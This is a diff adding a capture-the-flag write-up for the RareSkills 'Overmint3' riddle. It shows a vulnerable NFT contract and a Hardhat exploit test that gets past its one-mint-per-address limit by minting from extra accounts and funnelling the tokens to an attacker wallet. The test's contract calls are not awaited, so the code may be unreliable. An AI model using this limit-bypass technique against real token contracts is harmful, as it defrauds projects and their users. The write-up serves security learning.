@@ -241,6 +241,85 @@ describe("[Challenge] Truster", function () {
 });
 ```
 
+## RareSkills Riddles - Overmint3
+
+### Contracts
+
+```solidity
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity 0.8.15;
+import "@openzeppelin/contracts/utils/Address.sol";
+import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
+
+contract Overmint3 is ERC721 {
+    using Address for address;
+    mapping(address => uint256) public amountMinted;
+    uint256 public totalSupply;
+
+    constructor() ERC721("Overmint3", "AT") {}
+
+    function mint() external {
+        require(!msg.sender.isContract(), "no contracts");
+        require(amountMinted[msg.sender] < 1, "only 1 NFT");
+        totalSupply++;
+        _safeMint(msg.sender, totalSupply);
+        amountMinted[msg.sender]++;
+    }
+}
+```
+
+### Exploit
+
+To solve this riddle, we have to find a way to mint 5 NFTs to the attacker's wallet. While we can't call `mint()` five times from the attacker's wallet because of the second `require` statement, we can create four additional accounts, mint NFTs from these accounts, and subsequently transfer those NFTs to the attacker's wallet. 
+
+_Overmint3.js_
+```javascript
+const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
+const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
+const { expect } = require("chai");
+const { ethers } = require("hardhat");
+
+const NAME = "Overmint3";
+
+describe(NAME, function () {
+    async function setup() {
+        const [owner, attackerWallet] = await ethers.getSigners();
+
+        const VictimFactory = await ethers.getContractFactory(NAME);
+        const victimContract = await VictimFactory.deploy();
+
+        return { victimContract, attackerWallet };
+    }
+
+    describe("exploit", async function () {
+        let victimContract, attackerWallet;
+        before(async function () {
+            ({ victimContract, attackerWallet } = await loadFixture(setup));
+        });
+
+        it("conduct your attack here", async function () {
+            const [owner, attackerWallet, user1, user2, user3] = await ethers.getSigners();
+            victimContract.connect(owner).mint();
+            victimContract.connect(owner).transferFrom(owner.address, attackerWallet.address, 1);
+            victimContract.connect(user1).mint();
+            victimContract.connect(user1).transferFrom(user1.address, attackerWallet.address, 2);
+            victimContract.connect(user2).mint();
+            victimContract.connect(user2).transferFrom(user2.address, attackerWallet.address, 3);
+            victimContract.connect(user3).mint();
+            victimContract.connect(user3).transferFrom(user3.address, attackerWallet.address, 4);
+            victimContract.connect(attackerWallet).mint();
+        });
+
+        after(async function () {
+            expect(await victimContract.balanceOf(attackerWallet.address)).to.be.equal(5);
+            expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.equal(
+                1,
+                "must exploit one transaction"
+            );
+        });
+    });
+});
+```
 
 # Security - Week 2
 
